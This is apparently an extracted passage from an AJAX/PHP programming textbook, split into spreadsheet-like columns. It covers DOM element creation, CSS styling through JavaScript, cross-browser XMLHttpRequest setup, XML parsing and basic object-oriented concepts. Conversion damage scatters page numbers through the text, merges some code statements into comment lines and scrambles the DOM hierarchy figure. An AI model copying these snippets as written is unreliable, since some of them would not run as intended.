Larger Text,Smaller Text,Symbol
Even more DOM ,"In the previous exercise, you created the list of elements by joining strings to compose a 
 simple HTML structure. This time, we'll take a look at how to use standards-compliant 
 DOM functions to generate HTML output. The structure that we want to create is similar 
 to that from the previous exercise, except this time, we also generate the list of colors 
 and the paragraph 
 Hey dude…
  dynamically. 
  
 The generated code will look like this:
  
 <div id=""myDivElement"">
  
  
  <p>
  
  
  Hey! Here's a cool list of colors for you:
  
  </p>
  
  
  <ul>
  
  
  <li>Black</li>
  
  
  <li>Orange</li>
  
  
  <li>Pink</li>
  
  
  </ul> 
  
 </div>
  
 Before we begin the next example, there are a few things that we need to briefly cover. A 
 DOM document is a hierarchical structure of elements and each element can have one or 
 more attributes. The 
 document
  object's root node, which you can access, is 
 <body>
 . In the 
 above HTML fragment, the element 
 <div>
  has a single attribute called 
 id
  with the value 
 myDivElement
 . The hierarchical or tree structure of the above code looks like Figure 2-3:
  
 <body>
  
  
 <div>
  
 <p>
  
 Hello dude! Here's a cool list of colors for you
  
 <br>
  
  
 <li>
  
 Black
  
 <ul>
  
 <li>
  
 Orange
  
 <li>
  
 Pink
  
 Figure 2-3: A hierarchy of HTML elements
  
 In the preceding figure, you see an HTML structure formed of 
 <body>
 , 
 <div>
 , 
 <br>
 , 
 <ul>
 , and 
 <li>
  elements, and four text nodes (
 Hello…
 , 
 Black
 , 
 Orange
 , 
 Pink
 ). In the 
 next exercise, you will create this structure using the DOM functions 
 createElement()
 , 
 createTextNode()
 , and 
 appendChild()
 . 
  
 [
  46 
 ]",NA
Time for action – even more DOM ,"1. In the 
 ajax/javascript
  folder, create a folder named 
 jsdom2
 . 
  
 2. In 
 the 
 jsdom2
  folder, create a file named 
 jsdom2.html
  and type the 
  
  
 following code:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html> 
  
  
  <head>
  
  
  <title>AJAX Foundations: More JavaScript and DOM</title>
  
  
 <script type=""text/javascript"" src=""jsdom2.js""></script>
  
  
 </head>
  
  
  <body onload=""process()"">
  
  
  <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 3. Create 
 jsdom2.js
  and type the following code:
  
 function process() 
  
 {
  
  
  // create the <p> element
  
  
  oP = document.createElement(""p"");
  
  
  // create the ""Hello..."" text node
  
  
  oHelloText = document.createTextNode
  
  
  (""Hey dude! Here's a cool list of colors for you:"");
  
  // add the text node as a child element of <p>
  
  
  oP.appendChild(oHelloText);
  
  // create the <ul> element
  
  oUl = 
 document.createElement(""ul"")
  
  // create the first <ui> element and add a text node to 
 it oLiBlack = document.createElement(""li"");
  
  oBlack = document.createTextNode(""Black"");
  
  oLiBlack.appendChild(oBlack);
  
  // create the second <ui> element and add a text node to it 
 oLiOrange = document.createElement(""li"");
  
  oOrange = document.createTextNode(""Orange"");
  
  oLiOrange.appendChild(oOrange);
  
  // create the third <ui> element and add a text node to 
 it oLiPink = document.createElement(""li"");
  
  oPink = document.createTextNode(""Pink"");
  
 [
  47 
 ]",NA
What just happened?,"Although there are many lines of code, the functionality is pretty simple and it follows a 
 clean coding practice that, at least in theory, generates code that is easier to maintain in 
 the long run. This suggests clearly enough that using the DOM to create HTML structures 
 may not always be the best option. However, in complex projects, it can actually make 
 life easier; here's why:
  
 •
  
 It's fairly easy to use DOM to programmatically create dynamic HTML 
 structures, such as building elements in 
 for
  loops, because you're not 
 concerned about text formatting but about building the structural elements. You 
 don't need, for example, to manually add closing tags. When you add a 
 <ui>
  
 element, the DOM will generate the 
 <ui>
  tag and the associated closing 
 </ui>
  
 tag for you.
  
 [
  48 
 ]",NA
"JavaScript, DOM, and CSS","As you most likely know, CSS is a powerful language used to describe the appearance 
 of the elements of a web page. CSS definitions can be stored in one or more files with 
 the 
 .css
  extension, allowing web designers to separate styling definitions from 
 HTML document structure. If the job is done right, and done consistently in a 
 website, CSS is a powerful tool allowing you to make minor or sweeping visual 
 changes to an entire site with very little time or effort, just by editing the CSS file. 
  
 While 
 technically
  it's not necessary to know CSS when implementing 
  
 AJAX, in practice it's very desirable to be at least educated in CSS basics, 
  
 even if the HTML and CSS design is created by someone else. CSS is a vast subject; 
 there are many books and tutorials on CSS, including those you can find at 
 http://www.w3.org/Style/CSS/learning
  and 
 http://www.csstutorial.net/
 .
  
 We will do a simple exercise to demonstrate CSS techniques, and manipulating styles 
 using JavaScript and the DOM. In the following exercise, you will draw a nifty little table 
 and two buttons, 
 Set Style 1
  and 
 Set Style 2
 , that will change the table's appearance by 
 switching the current style. See Figure 2-5 to get a feel of what you're about to create.",NA
Time for action – working with CSS and JavaScript,"1. In the 
 javascript
  folder, create a new subfolder called 
 css
 .
  
 2. In your newly created 
 csstest
  folder, create a new file called 
  
 cssdemo.html
 with the following contents:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www. 
 w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 <html>
  
  <head>
  
  <title>AJAX Foundations: JavaScript and CSS Demo</title>
  
  <script type=""text/javascript"" src=""cssdemo.js""></script>
  
  <link href=""cssdemo.css"" type=""text/css"" rel=""stylesheet""/> 
  
  </head>
  
  <body>
  
  <table id=""table"">
  
  <tr>
  
  <th id=""tableHead"">
  
  Product Name
  
  </th>
  
  </tr>
  
  <tr>
  
 [
  50 
 ]",NA
What just happened?,"Your 
 cssdemo.css
  file contains two sets of styles that can be applied to the table in 
 cssdemo.html
 . When the user clicks one of the 
 SetStyle
  buttons (an event that calls 
 the appropriate 
 setStyle()
  function), the JavaScript DOM is used to assign those 
 styles to the elements of the table. (Take a quick look at the HTML page so you are 
 familiar with where these styles are implemented.)
  
 In the first part of the 
 setStyle()
  methods, we use the 
 getElementById()
  function to 
 obtain references to the HTML elements that we want to apply CSS styles to:
  
  // obtain references to HTML elements
  
  oTable = document.getElementById(""table"");
  
  oTableHead = document.getElementById(""tableHead"");
  
  oTableFirstLine = document.getElementById(""tableFirstLine"");
  
  oTableSecondLine = document.getElementById(""tableSecondLine"");
  
 [
  53 
 ]",NA
Using the XMLHttpRequest object,"XMLHttpRequest
  is the object that enables JavaScript to make asynchronous HTTP 
 requests to the server and  receive responses from it, and then update parts of the page 
 completely in the background. Combine 
 XMLHttpRequest
 , CSS, and DOM and you have 
 all the ingredients for that responsive, visually appealing, and ""smart"" site we keep 
 telling you about—without visually interrupting the user. AJAX!
  
 The 
 XMLHttpRequest
  object was initially implemented by Microsoft in 1999 as an 
 ActiveX object in Internet Explorer, and eventually became the 
 de facto
  standard for all 
 the browsers, being supported as a native object by all modern web browsers. 
  
 The typical sequence of operations when working with 
 XMLHttpRequest
  is as 
 follows:
  
 1. Create an instance of the 
 XMLHttpRequest
  object.
  
 2. Use the 
 XMLHttpRequest
  object to make an asynchronous call to a server page and 
 define a callback function that will be executed automatically when the server 
 response is received.
  
 3. Evaluate the server's response in the callback function.
  
 4. Carry out updating of the web page with the data received.
  
 5. Return to step 2.
  
 [
  54 
 ]",NA
Creating the XMLHttpRequest object ,"The 
 XMLHttpRequest
  is implemented in different ways by browsers. In Internet 
 Explorer 6 and older, 
 XMLHttpRequest
  is implemented as an ActiveX control, and you 
 instantiate it like this:
  
 xmlhttp = new ActiveXObject(""Microsoft.XMLHttp"");
  
 For the other web browsers, including Google Chrome, Firefox, Opera, Safari, and 
 Internet Explorer 7 and 8, 
 XMLHttpRequest
  is a native object, so you create instances of 
 it like this:
  
 xmlhttp = new XMLHttpRequest();
  
 A simplified version of the code we will use for cross-browser 
 XMLHttpRequest 
 instantiation throughout this book is the following(we've highlighted the relevant 
 pieces of code for you.):
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // will store the reference to the XMLHttpRequest 
 object
  
  var xmlHttp;
  
  
  // create the XMLHttpRequest object
  
  
  try
  
  
  {
  
  
  // assume IE7 or newer or other modern browsers
  
  
  xmlHttp = new XMLHttpRequest();
  
  
  }
  
  
  catch(e)
  
  
  {
  
  
  // assume IE6 or older
  
  
  try
  
  
  {
  
    
  xmlHttp = new ActiveXObject(""Microsoft.XMLHttp"");
  
  
 }
  
  
  catch(e) { }
  
  
  }
  
  
  // return the created object or display an error 
 message
  
  if (!xmlHttp)
  
  
  alert(""Error creating the XMLHttpRequest object."");
  
  
 else 
  
 [
  55 
 ]",NA
JavaScript exception handling,"The 
 try
 /
 catch
  construct, initially implemented with OOP languages, offers a powerful 
 exception-handling technique in JavaScript. Basically, when an error happens in 
 JavaScript code, an exception is thrown. The exception has the form of an object that 
 contains the error's (exception's) details. By using the 
 try
 /
 catch 
 syntax, you can 
 catch
  the exception and handle it locally, so that the error won't be propagated to the 
 user's browser. 
  
 The 
 try
 /
 catch
  syntax is as follows:
  
 try 
  
 { 
  
  
  // code that might generate an exception 
  
 } 
  
 catch (e) 
  
 { 
  
  
  // code that is executed only if an exception was thrown by the try 
 block 
  
  
  // (exception details are available through the e parameter) 
  
 }
  
 You place any code that might generate errors inside the 
 try
  block. If it gives an 
 error , the execution is passed immediately to the 
 catch
  block. If there's no error 
 inside the 
 try
  block, then the code in the 
 catch
  block never executes.
  
 Runtime exceptions propagate from the point they were raised, up through the call stack 
 of your program. If you don't handle the exception locally, it will end up getting caught by 
 the web browser, which may display a not very good-looking error message to your 
 visitor.
  
 The way you respond to each exception depends very much on the situation at hand. 
 Sometimes you will simply ignore the error, other times you will flag it somehow in the 
 code, or you will display an error message to your visitor. Rest assured that in this book 
 you will meet all kinds of scenarios.
  
 [
  56 
 ]",NA
Creating better objects for Internet Explorer 6 ,"The one thing that can be improved about the 
 createXmlHttpRequestObject 
 function is to have it recognize the latest version of the ActiveX control, in case the 
 browser is Internet Explorer 6. In most cases, you can rely on the basic functionality 
 provided by 
 ActiveXObject(""Microsoft.XMLHttp"")
 , but if you want to try using a 
 more recent version, you can.
  
 The typical solution is to try creating the latest known version, and if it fails, ignore the 
 error and retry with an older version, and so on until you get an object instead of an 
 exception. The latest 
 prog ID
  of the 
 XMLHTTP
  ActiveX Object is 
 MSXML2.
  
 XMLHTTP.6.0
 . For more details about these prog IDs, or to simply get a better 
 idea of the chaos that lies behind them, feel free to read a resource such as 
 http://puna.net.nz/etc/xml/msxml.htm
 .
  
 Here is the upgraded version of 
 createXmlHttpRequestObject
 . The new bits 
 are highlighted:
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // will store the reference to the XMLHttpRequest object
  
  
 var xmlHttp;
  
  
  // create the XMLHttpRequest object
  
  
  try
  
  
  {
  
  
  // assume IE7 or newer or other modern browsers
  
  
  xmlHttp = new XMLHttpRequest();
  
  
  }
  
  
  catch(e)
  
  
  {
  
  
  // assume IE6 or older
  
  
  var XmlHttpVersions = new Array('MSXML2.XMLHTTP.6.0',
  
      
  'MSXML2.XMLHTTP.5.0',
  
      
  'MSXML2.XMLHTTP.4.0',
  
      
  'MSXML2.XMLHTTP.3.0',
  
      
  'MSXML2.XMLHTTP',
  
      
  'Microsoft.XMLHTTP');
  
  
  // try every prog id until one works
  
  
  for (var i=0; i<XmlHttpVersions.length && !xmlHttp; i++) 
  
  
 {
  
    
  try 
  
    
  { 
  
     
  // try to create XMLHttpRequest object
  
     
  xmlHttp = new ActiveXObject(XmlHttpVersions[i]);      } 
  
 [
  59 
 ]",NA
Initiating server requests using ,NA,NA
XMLHttpRequest ,"After creating the 
 XMLHttpRequest
  object, you can do loads of interesting things 
 with it. You will learn the most interesting details about 
 XMLHttpRequest
  by 
 practice, but for a quick reference here are the object's methods and properties:
  
 Method/Property
  
 Description
  
 abort()
  
 Stops the current request.
  
  
 getAllResponseHeaders() 
  
 getResponseHeader(""headerLabel"") 
 open(""method"", ""URL""[, 
  
 asyncFlag[, ""userName""[, 
  
 ""password""]]]) 
  
 send(content) 
  
 setRequestHeader(""label"", 
  
 ""value"")
  
 onreadystatechange
  
 Returns the response headers as a string. 
 Returns a single response header as a string. 
 Initializes the request parameters. 
  
 Performs the HTTP request.
  
 Sets a label/value pair to the request header. 
 Used to set the callback function that handles 
 request state changes.
  
 [
  60 
 ]",NA
Handling server response ,"The 
 handleRequestStateChange()
  method is the callback method that we set to 
 handle the request state of the request changes (due to server responses). In practice, 
 we're interested in the state that indicates the server response has been fully received.
  
 Usually, 
 handleRequestChange()
  is called four times, once for every time the 
 request enters a new state. The state of the request, returned by the 
 readyState 
 property, can be any of the following:
  
 0 = uninitialized 
  
 1 = loading 
  
 2 = loaded 
  
 3 = interactive 
  
 4 = complete
  
 Except for state 
 3
 , these are rather self-explanatory terms. The 
 interactive
  state is 
 an intermediate state when the response has been partially received. In our AJAX 
 applications, we will only use the 
 complete
  state, which marks that a response has 
 been received from the server.
  
 The typical implementation of 
 handleRequestStateChange()
  is shown in the 
 following code snippet, which highlights the portion where you actually read the 
 response from the server. Here too we can successfully use 
 try
 /
 catch
  to handle errors 
 that could happen when initiating a connection to the server, or when reading the 
 response from the server. Before attempting to read the received data, we also verify 
 that the response status code is 200. Sending such a code indicating the status of the 
 request is part of the HTTP protocol, and 200 is the status code that specifies that the 
 request completed successfully:
  
 // function executed when the state of the request 
 changes function handleRequestStateChange() 
  
 {
  
  
  // continue if the process is completed
  
  
  if (xmlHttp.readyState == 4) 
  
  
  {
  
  
  // continue only if HTTP status is ""OK""
  
  
  if (xmlHttp.status == 200) 
  
  
  {
  
    
  try
  
    
  {
  
     
  // retrieve the response
  
     
  response = xmlHttp.responseText;
  
     
  // do something with the response
  
     
  // ...
  
 [
  63 
 ]",NA
Time for action – making asynchronous calls with ,NA,NA
XMLHttpRequest ,"1. In the 
 javascript
  folder, create a subfolder named 
 xmlhttprequest
 . 
  
 2. In the 
 xmlhttprequest
  folder, create a file called 
 async.txt
 , and add 
  
  
 the following text to it:
  
 Hello, client!
  
 3. In the same folder create a file called 
 async.html
 , and add the following 
  
 code 
 to it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html>
  
  
  <head>
  
  
  <title>AJAX Foundations: Using XMLHttpRequest</title>
  
  
 <script type=""text/javascript"" src=""async.js""></script>
  
  
 </head>
  
  
  <body onload=""process()"">
  
  
  <p>Hello, server!</p>
  
  
  <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 4. In the same folder create a file called 
 async.js
  with the following contents:
  
 // holds an instance of XMLHttpRequest 
  
 var xmlHttp = createXmlHttpRequestObject();
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // will store the reference to the XMLHttpRequest object
  
  var xmlHttp;
  
  
  // create the XMLHttpRequest object
  
  
  try
  
  
  {
  
  
  // assume IE7 or newer or other modern browsers
  
  
  xmlHttp = new XMLHttpRequest();
  
  
  }
  
  
  catch(e)
  
  
  {
  
  
  // assume IE6 or older
  
 [
  65 
 ]",NA
What just happened?,"To understand the exact flow of execution, let's start from where the processing 
 begins—the 
 async.html
  file:
  
 <html>
  
  
  <head>
  
  
  <title>AJAX Foundations: Using XMLHttpRequest</title>
  
  
 <script type=""text/javascript"" 
 src=""async.js""
 ></script>
  
  
 </head>
  
  
  <body 
 onload=""process()""
 >
  
 This bit of code hides some interesting functionality. First, it references the 
 async.js 
 file, and the code in that file is parsed. Remember that the code residing in JavaScript 
 functions does not execute automatically, but the rest of the code does. All the code in our 
 JavaScript file is packaged as functions, except one line:
  
 // holds an instance of XMLHttpRequest 
  
 var xmlHttp = createXmlHttpRequestObject();
  
 This way, we ensure that the 
 xmlHttp
  variable contains an 
 XMLHttpRequest 
 instance right from the start. The 
 XMLHttpRequest
  instance is created by calling the 
 createXmlHttpRequestObject()
  function that you encountered a bit earlier.
  
 The 
 process()
  method gets executed when the 
 onload
  event fires. To guard against 
 potential problems, the 
 process()
  method first checks to be sure the 
 xmlHttp
  object 
 has been initialized. If we have a valid 
 xmlHttp
  object, we use it to asynchronously read 
 asynx.txt
  from the server. While waiting for the response, we change the cursor to the 
 ""busy"" icon:
  
 // performs a server request and assigns a callback function 
 function process() 
  
 {
  
  
  // only continue if we have a valid xmlHttp object
  
  
  if (xmlHttp)
  
  
  {
  
  
  // try to connect to the server
  
  
  try
  
  
  {
  
    
  // initiate reading the async.txt file from the server
    
  xmlHttp.open(""GET"", ""async.txt"", true);
  
    
  xmlHttp.onreadystatechange = handleRequestStateChange;
    
  xmlHttp.send(null);
  
    
  // change cursor to ""busy"" hourglass icon
  
    
  document.body.style.cursor = ""wait"";    
  
  
  }
  
 [
  69 
 ]",NA
Working with XML structures ,"XML documents are similar to HTML documents in that they are text-based, and 
 contain hierarchies of elements. You can use the DOM to manipulate XML files just as 
 you did for manipulating HTML files.
  
 XML is one of the two popular data exchange formats used in AJAX applications (the other 
 format is JSON and we'll talk about it in Chapter 3, 
 Object Oriented JavaScript
 ). It's 
 important to understand that using XML in AJAX applications is optional (even though 
 XML puts the X in AJAX and the prefix in 
 XMLHttpRequest
 ). In the previous exercise, you 
 created a simple application that made an asynchronous call to the server, just to receive 
 a text document; no XML was involved.
  
 [
  71 
 ]",NA
Time for action – making asynchronous calls with ,NA,NA
XMLHttpRequest and XML ,"1. Under the 
 javascript
  folder, create a subfolder called 
 xml
 .
  
 2. In the 
 xml
  folder, create a file called 
 books.xml
 , which will contain the XML 
 structure that we will read using JavaScript's DOM. Add the following content to 
 the file:
  
 <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> 
 <response>
  
  
  <books>
  
  
  <book>
  
    
  <title>
  
     
  AJAX and PHP: Building Modern Web Applications,  
     
  2nd Edition
  
    
  </title>
  
    
  <isbn>
  
     
  978-1904817726
  
    
  </isbn>
  
  
  </book>
  
  
  <book>
  
    
  <title>
  
     
  Beginning PHP and MySQL E-Commerce, 2nd Edition
    
  </title>
  
    
  <isbn>
  
     
  978-1590598641
  
    
  </isbn>
  
  
  </book>
  
  
  <book>
  
    
  <title>
  
     
  Professional Search Engine Optimization with PHP
    
  </title>
  
    
  <isbn>
  
     
  978-0470100929
  
    
  </isbn>
  
  
  </book>
  
  
  </books> 
  
 </response>
  
 [
  72 
 ]",NA
What just happened?,"Most of the code will already start looking familiar, as it builds the basic framework we 
 have built so far. The novelty consists in the 
 handleServerResponse()
  function, which 
 is called from 
 handleRequestStateChange()
  when the request is complete.
  
 The 
 handleServerResponse()
  function starts by retrieving the server response in 
 XML format:
  
 // handles the response received from the server
  
 function handleServerResponse()
  
 {
  
  // read the message from the server
  
  var xmlResponse = xmlHttp.responseXML;
  
 The 
 responseXML
  property of the 
 XMLHttpRequest
  object wraps the received response 
 as a DOM document. If the response isn't a valid XML document, the browser might throw 
 an error. However, this depends on the specific browser you're using, because each 
 JavaScript and DOM implementation behaves in its own way.
  
 [
  76 
 ]",NA
Handling more errors and throwing ,NA,NA
exceptions,"As highlighted earlier, if the XML document you're trying to read is not valid, each 
 browser will react in its own way. We have made a simple test by removing the closing 
 </response>
  tag from 
 books.xml
 . Firefox will throw an error to the 
 ErrorConsole 
 (see 
 Figure 2-9), but besides that, no error will be shown to the user. This is not good, of 
 course, because not many users browse websites looking at the 
 ErrorConsole
 . 
  
 Open the Firefox JavaScript console from 
 Tools | Error Console
 . (Please see Chapter 6, 
 Debugging and Profiling AJAX Applications
 , for more details about the JavaScript Console 
 and other excellent tools that help with debugging.)
  
  
 Figure 2-9: The Firefox JavaScript Console is Very Useful
  
 Opera, Internet Explorer, Chrome, and Safari are friendlier. They do catch 
  
 the error using the 
 try
 /
 catch
  blocks. Opera offers the most detailed error message 
 (Figure 2-10 shows the standard one; it can be configured to be much more verbose), 
 but you can customize the message you display to your visitor.
  
  
 Figure 2-10: Opera displaying an error message
  
 [
  78 
 ]",NA
Creating XML structures ,"XML and DOM are everywhere. In this chapter, you used the DOM to create HTML 
 elements on the existing DOM object called 
 document
 , and you also learned how to read 
 XML documents received from the server. An important detail that we didn't cover was 
 creating brand new XML documents using JavaScript's DOM. You may need to perform 
 this kind of functionality if you want to create XML documents on the client, and send 
 them for reading on the server.
  
 We won't go through more examples, but we will show you the missing bits. The trick 
 with creating a brand new XML document is creating the XML document itself. When 
 adding elements to the HTML output, you used the implicit 
 document
  object, but this is 
 not an option when you need to create a new document.
  
 When creating a new DOM object with JavaScript, we're facing the same problem as with 
 creating 
 XMLHttpRequest
  objects: the method of creating the object depends on the 
 browser. The following function is a universal function that returns a new instance of a 
 DOM object:
  
 function createDomObject() 
  
 {
  
  
  // will store reference to the DOM object 
  
  
  var xmlDoc;
  
  
  // create XML document
  
  
  if (document.implementation && document.implementation.
  
 createDocument)
  
  
  {
  
  
  xmlDoc = document.implementation.createDocument("""", """", null);
  
  }
  
  
  // works for Internet Explorer
  
  
  else if (window.ActiveXObject)
  
  
  {
  
  
  xmlDoc = new ActiveXObject(""Microsoft.XMLDOM"");
  
  
  }
  
  
  // returns the created object or displays an error message
  
  
 if (!xmlDoc)
  
  
  alert(""Error creating the DOM object."");
  
  
  else 
  
  
  return xmlDoc;
  
 }
  
 [
  79 
 ]",NA
Summary,"This chapter walked you through many fields. Working with HTML, JavaScript, CSS, the 
 DOM, XML, and 
 XMLHttpRequest
  is certainly not easy to start with, especially if some of 
 these technologies are new to you. Where you don't feel confident enough, have a look at 
 the aforementioned resources. When you feel ready, proceed to Chapter 3, 
 Object Oriented 
 JavaScript
 , where you will learn about object-oriented programming and JavaScript. 
  
 [
  80 
 ]",NA
Object Oriented JavaScript,"Most programmers assume that by having some prior knowledge of a programming 
 language such as C++, Java, C#, or PHP, they can easily add JavaScript to their résumé. 
 Additionally, if they have used it on a couple of projects, they tend to rate themselves 
 rather highly at it as well.
  
 In reality, JavaScript is a complex and unique programming language, but because its 
 learning curve is very sharp and we can do a lot of stuff with it very quickly, we tend to 
 use it superficially—if it gets the job done, why look further?
  
 In this chapter, you'll learn that, internally, JavaScript is fundamentally different from 
 ""traditional"" OOP languages, and that it gives you great power and flexibility in 
 implementing fascinating features. You'll learn:
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 Basic OOP concepts—encapsulation, polymorphism, and inheritance How 
 to work with JavaScript objects, functions, classes, and prototypes How to 
 simulate private, instance, and static class members in JavaScript What the 
 JavaScript execution context is 
  
 How to implement inheritance by using constructor functions and 
 prototyping 
  
 JSON basics
  
 Let's get started then!",NA
Why is OOP in JavaScript important?,"In 2000, JavaScript frameworks were nearly non-existent and the term AJAX was yet to 
 be coined. The 
 ObjectOriented
  (
 OO
 ) features of JavaScript slipped under the radar 
 and went grossly underexploited. Over the years, web technologies have matured and 
 flourished such that previously hidden gems, such as JavaScript and other 
 Object 
 Oriented Programming
  (
 OOP
 ) languages, have come to the fore. 
  
 Today, frameworks are very common and rely heavily on features such as OOP. Armed 
 with the OO features of JavaScript, we have rather impressive frameworks of more 
 than 10,000 lines of code. And we add another layer that extends core functionality by 
 using core frameworks like script.aculo.us, jQuery, and the 
 Yahoo! 
  
 User Interface Library
  (
 YUI
 ) to name a few. There are an impressive number of 
 powerful, flexible, and easy-to-use JavaScript frameworks at our disposal but without a 
 firm grasp on OOP techniques (and the particularities of JavaScript OO) it's difficult to 
 fully exploit them.
  
 Knowing where to start with OOP and OO features is really important. The material in the 
 following chapters relies on these concepts, so here is the right place to tackle the features 
 of OO that will be used throughout the book. To be sure we're all on the same page, we'll 
 briefly review the essential OOP concepts—objects, classes, encapsulation, and 
 inheritance and then ""port"" this knowledge into the realm of JavaScript.",NA
Object-oriented programming concepts,"What does 
 object-oriented programming
  mean anyway? Basically, as the name 
 suggests, OOP puts objects at the center of the programming model. The 
 object 
 is 
 probably the most important concept in the world of OOP—a self-contained entity 
 that has 
 state
  and 
 behavior
 , just like a real-world object. An object is an instance of 
 a 
 class
  (also called 
 type
 ). A 
 class
  defines the behavior that is shared by instances of 
 its objects. We often use objects and classes in our programs to represent real-
 world objects, and types (classes) of objects. For example, we can have classes like 
 Car
 , 
 Customer
 , 
 Document
 , or 
 Person
 , and objects such as 
 myCar
 , 
 customerJoe
 , 
 myWarranty
 , and 
 theBoss
 .
  
 The concept is intuitive—the class represents an archetype (a blueprint or model that 
 instances are based on), and objects are particular 
 instances
  of that model. For example, 
 all 
 Car
  objects will have the same behavior—the ability to change direction, speed, gear, 
 lanes, and so on. Each individual 
 Car
  object will have its own unique set of values at any 
 particular time, called its ""state"". In programming, an object's state is described by its 
 properties
  and 
 fields
 , while its behavior is defined by its 
 methods 
 and 
 events
 .
  
 [
  82 
 ]",NA
Encapsulation,"The communication with an object is done only via its 
 publicinterface
 , which allows 
 you interact with an object without worrying about how that interaction is actually 
 implemented; this is encapsulation. We can say that encapsulation separates 
 implementation from interface. You don't have to know how these objects do their work 
 internally; all you need to know are the features that you can use.
  
 The ""features you can use"" of a class form the 
 publicinterface
  of a class, which is the sum 
 of all its public members. The public members are those members that are visible and can 
 be used by external classes. In a 
 Car
  class, we might find the public methods, 
 turn()
 , 
 stop()
 , and 
 go()
 . Even without knowing how the 
 turn()
  method actually does the work 
 of turning the car, it's easily done by simply calling the 
 turn()
  method.
  
 [
  83 
 ]",NA
Inheritance,"Inheritance allows creating classes that are specialized versions of an existing class. 
  
 For example, assume that you have the 
 Car
  class, which is used to create objects such as 
 myCar
 , 
 johnsCar
 , or 
 davesCar
 . Now, assume that you want to introduce the concept of 
 a supercar, which would have similar functionality to the car, but some extra features as 
 well, such as the capability to fly!
  
 It might seem like the obvious move would be to create a new class named 
  
 SuperCar
 , and use this class to create the necessary objects such as 
 mySuperCar
 , or 
 davesSuperCar
 . But by using this idea, you would have to recreate all of the properties 
 and methods that were common between the 
 Car
  class and the 
 SuperCar 
 class. 
 Wouldn't it be nice if you could just add those properties and methods that apply only to 
 the 
 SuperCar
 ? Well, it's inheritance to the rescue here. Inheritance allows you to create 
 the 
 SuperCar
  class based on the 
 Car
  class, so you don't need to code all the common 
 features once again. Instead, you can create 
 SuperCar
  as a ""child"" of the 
 Car
  class. Just as 
 children inherit the traits of parents, 
 SuperCar
  inherits all the functionality of 
 Car
 . To 
 create the additional features that you want for your 
 SuperCar
 , you create only the new 
 supporting code—such as a method named 
 Fly
 . 
  
 In this scenario, 
 Car
  is the 
 baseclass
  (also referred to as 
 superclass 
 or
  parent
 ), and 
 SuperCar
  is the 
 derived
  class (also referred to as 
 subclass
  or
  child
 ).
  
 Inheritance is a great concept because it encourages code reuse. The potential negative 
 side effect is that inheritance, by its nature, creates an effect known as 
 tight coupling
  
 between the base class and the derived classes. Tight coupling refers to the fact that any 
 changes that are made to a base class are automatically propagated to all the derived 
 classes. For example, if you make a performance improvement in the code of the original 
 Car
  class, that improvement will propagate to 
 SuperCar
  as well. Usually, this can be used 
 to your advantage, but if the inheritance hierarchy isn't wisely designed, such coupling 
 can impose future restrictions on how you can expand or modify your base classes 
 without breaking the functionality of the derived classes (a potentially knotty problem 
 that makes cogitating on your design before you build it a very worthwhile task).
  
 [
  84 
 ]",NA
Polymorphism,"Polymorphism is an advanced OOP feature that allows using objects of different 
 classes when you only know the common base class from which they both derive. 
  
 Polymorphism permits using a base class reference to access objects of that class, or 
 objects of derived classes. Using polymorphism, you can have, for example, a method, 
 that receives as a parameter an object of type 
 Car
 , and when calling that method you 
 supply an object of type 
 SuperCar
  as a parameter. Because 
 SuperCar
  is a specialized 
 version of 
 Car
 , all the public functionality of 
 Car
  is also supported by 
 SuperCar
 , even 
 though the 
 SuperCar
  implementation differs from 
 Car
 . This kind of flexibility gives a 
 great deal of power to an experienced programmer who knows how to take advantage 
 of it.",NA
Object-oriented programming with ,NA,NA
